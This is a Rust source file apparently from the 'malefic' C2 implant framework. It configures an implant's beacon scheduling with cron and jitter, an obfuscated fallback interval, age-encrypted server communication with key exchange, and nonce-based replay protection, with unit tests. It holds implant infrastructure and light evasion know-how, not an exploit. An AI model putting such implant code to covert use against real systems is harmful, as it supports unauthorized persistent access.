use malefic_config::{CRON, JITTER};
use malefic_cron::Cronner;
use malefic_gateway::obfstr::obfstr;

pub struct MetaConfig {
    uuid: [u8; 4],
    pub scheduler: Cronner, // interval scheduler
    #[cfg(feature = "secure")]
    pub private_key: String, // private_key for implant，for decode server's data
    #[cfg(feature = "secure")]
    pub server_public_key: String, // public_key for server，encode data to server
    #[cfg(feature = "secure")]
    pending_private_key: Option<String>,
    #[cfg(feature = "secure")]
    pending_server_public_key: Option<String>,
    #[cfg(feature = "secure")]
    key_exchange_state: KeyExchangeState,
    #[cfg(feature = "secure")]
    seen_nonces: std::collections::VecDeque<String>,
}

#[cfg(feature = "secure")]
#[derive(PartialEq)]
enum KeyExchangeState {
    Idle,
    Pending,
    ResponseSent,
}

impl MetaConfig {
    pub fn new(uuid: [u8; 4]) -> Self {
        let scheduler = Cronner::new(&CRON, *JITTER).unwrap_or_else(|_| {
            Cronner::new(&*obfstr!("*/5 * * * * * *").to_string(), *JITTER).unwrap()
        });

        MetaConfig {
            uuid,
            #[cfg(feature = "secure")]
            private_key: malefic_config::AGE_PRIVATE_KEY.clone(),
            #[cfg(feature = "secure")]
            server_public_key: malefic_config::AGE_PUBLIC_KEY.clone(),
            #[cfg(feature = "secure")]
            pending_private_key: None,
            #[cfg(feature = "secure")]
            pending_server_public_key: None,
            #[cfg(feature = "secure")]
            key_exchange_state: KeyExchangeState::Idle,
            #[cfg(feature = "secure")]
            seen_nonces: std::collections::VecDeque::new(),
            scheduler,
        }
    }

    pub fn set_id(&mut self, uuid: [u8; 4]) {
        self.uuid = uuid;
    }

    pub fn update_schedule(&mut self, expression: &str, jitter: f64) -> anyhow::Result<()> {
        self.scheduler = Cronner::new(expression, jitter)
            .map_err(|e| anyhow::anyhow!("Failed to create scheduler: {}", e))?;
        Ok(())
    }

    pub fn new_heartbeat(&self) -> u64 {
        self.scheduler.next_interval()
    }

    pub fn get_uuid(&self) -> [u8; 4] {
        self.uuid
    }

    /// Get implant's private key for decrypting server data
    pub fn get_decrypt_key(&self) -> Option<&str> {
        #[cfg(feature = "secure")]
        {
            if self.private_key.is_empty() {
                None
            } else {
                use malefic_common::debug;
                debug!("get decrypt key: {}", self.private_key);
                Some(&self.private_key)
            }
        }
        #[cfg(not(feature = "secure"))]
        {
            None
        }
    }

    /// Get server's public key for encrypting data to server
    pub fn get_encrypt_key(&self) -> Option<&str> {
        #[cfg(feature = "secure")]
        {
            if self.server_public_key.is_empty() {
                None
            } else {
                Some(&self.server_public_key)
            }
        }
        #[cfg(not(feature = "secure"))]
        {
            None
        }
    }

    /// Derive implant public key from active private key
    #[allow(dead_code)]
    pub fn get_public_key(&self) -> Option<String> {
        #[cfg(feature = "secure")]
        {
            use malefic_common::debug;
            use malefic_crypto::crypto::age::parse_age_identity;

            if self.private_key.is_empty() {
                return None;
            }

            match parse_age_identity(&self.private_key) {
                Ok(identity) => Some(identity.to_public().to_string()),
                Err(err) => {
                    debug!("failed to derive public key from private key: {}", err);
                    None
                }
            }
        }
        #[cfg(not(feature = "secure"))]
        {
            None
        }
    }

    /// Check if nonce was already seen; record it if new.
    /// Returns `true` if accepted (new or empty), `false` if replayed.
    #[cfg(feature = "secure")]
    pub fn check_and_record_nonce(&mut self, nonce: &str) -> bool {
        if nonce.is_empty() {
            return true; // backward compat with old server
        }
        if self.seen_nonces.iter().any(|n| n == nonce) {
            return false; // replay detected
        }
        if self.seen_nonces.len() >= 32 {
            self.seen_nonces.pop_front();
        }
        self.seen_nonces.push_back(nonce.to_string());
        true
    }

    #[cfg(feature = "secure")]
    pub fn cache_key_exchange(&mut self, private_key: String, server_public_key: Option<String>) {
        self.pending_private_key = Some(private_key);
        self.pending_server_public_key = server_public_key.filter(|k| !k.is_empty());
        self.key_exchange_state = KeyExchangeState::Pending;
    }

    #[cfg(feature = "secure")]
    pub fn mark_key_exchange_response_sent(&mut self) {
        if self.key_exchange_state == KeyExchangeState::Pending
            && (self.pending_private_key.is_some() || self.pending_server_public_key.is_some())
        {
            self.key_exchange_state = KeyExchangeState::ResponseSent;
        }
    }

    #[cfg(feature = "secure")]
    pub fn commit_key_exchange_if_ready(&mut self) -> bool {
        if self.key_exchange_state != KeyExchangeState::ResponseSent {
            return false;
        }

        let mut updated = false;

        if let Some(private_key) = self.pending_private_key.take() {
            self.private_key = private_key;
            updated = true;
        }

        if let Some(server_public_key) = self.pending_server_public_key.take() {
            self.server_public_key = server_public_key;
            updated = true;
        }

        self.key_exchange_state = KeyExchangeState::Idle;
        updated
    }
}

#[cfg(all(test, feature = "secure"))]
mod tests {
    use super::*;

    /// Replayed nonce must be rejected
    #[test]
    fn test_nonce_dedup_rejects_replay() {
        let mut meta = MetaConfig::new([1, 1, 1, 1]);
        assert!(
            meta.check_and_record_nonce("nonce-1"),
            "first use of nonce should be accepted"
        );
        assert!(
            !meta.check_and_record_nonce("nonce-1"),
            "replayed nonce should be rejected"
        );
    }

    /// Different nonces should all be accepted
    #[test]
    fn test_nonce_dedup_accepts_different() {
        let mut meta = MetaConfig::new([2, 2, 2, 2]);
        assert!(meta.check_and_record_nonce("a"));
        assert!(meta.check_and_record_nonce("b"));
        assert!(meta.check_and_record_nonce("c"));
    }

    /// Empty nonce always accepted (backward compat with old servers)
    #[test]
    fn test_nonce_dedup_empty_skipped() {
        let mut meta = MetaConfig::new([3, 3, 3, 3]);
        assert!(
            meta.check_and_record_nonce(""),
            "empty nonce should always be accepted (backward compat)"
        );
        assert!(
            meta.check_and_record_nonce(""),
            "empty nonce should always be accepted even when repeated"
        );
    }

    /// After the window fills up, the oldest nonce is evicted and can be reused.
    /// The window holds 32 entries. Inserting a 33rd evicts the oldest (n0).
    #[test]
    fn test_nonce_dedup_evicts_old() {
        let mut meta = MetaConfig::new([4, 4, 4, 4]);
        // Fill up the 32-element window with n0..n31
        for i in 0..32 {
            assert!(
                meta.check_and_record_nonce(&format!("n{}", i)),
                "nonce n{} should be accepted on first use",
                i
            );
        }

        // All 32 slots occupied. n0 is still tracked (front of deque).
        assert!(
            !meta.check_and_record_nonce("n0"),
            "n0 should still be tracked (deque is full but not yet evicted)"
        );

        // Insert a 33rd nonce to force eviction of the oldest (n1, since n0
        // was rejected above and not re-inserted).
        // Actually n0 was rejected so deque still has [n0..n31]. Adding "extra"
        // will pop n0 and push "extra".
        assert!(
            meta.check_and_record_nonce("extra"),
            "new nonce 'extra' should be accepted, evicting n0"
        );

        // n0 was evicted, so it can be reused now
        assert!(
            meta.check_and_record_nonce("n0"),
            "evicted nonce n0 should be accepted again"
        );

        // n31 is still in the window (recent), so it should be rejected
        assert!(
            !meta.check_and_record_nonce("n31"),
            "recent nonce n31 should still be rejected"
        );
    }
}
